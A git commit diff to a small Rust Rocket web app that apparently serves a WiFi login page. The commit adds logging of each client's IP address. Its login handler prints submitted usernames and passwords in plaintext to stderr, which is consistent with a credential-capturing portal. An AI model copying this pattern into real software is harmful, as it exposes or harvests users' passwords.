7b068be1a4e815bf36873783896c1eb200280350
TaWeiTu <tu.da.wei@gmail.com>
2021-03-26 11:13:42 +0800

    Extract client IP

--- src/main.rs
+++ src/main.rs
@@ -3,12 +3,17 @@
 #[macro_use]
 extern crate rocket;
 
+extern crate rocket_client_addr;
+
 use rocket::request::Form;
 use rocket::response::NamedFile;
+use rocket_client_addr::ClientAddr;
 use std::io;
 
 #[get("/")]
-fn index() -> io::Result<NamedFile> {
+fn index(client_addr: ClientAddr) -> io::Result<NamedFile> {
+    let addr = client_addr.get_ipv4().unwrap();
+    eprintln!("{} is asking for WiFi.", addr);
     NamedFile::open("static/index.html")
 }
 
@@ -19,7 +24,8 @@ struct LoginInfo {
 }
 
 #[post("/login", data = "<user>")]
-fn login(user: Option<Form<LoginInfo>>) -> &'static str {
+fn login(user: Option<Form<LoginInfo>>, client_addr: ClientAddr) -> &'static str {
+    let addr = client_addr.get_ipv4().unwrap();
     match user {
         None => eprintln!("none"),
         Some(info) => eprintln!("name: {}, password: {}", info.username, info.password),
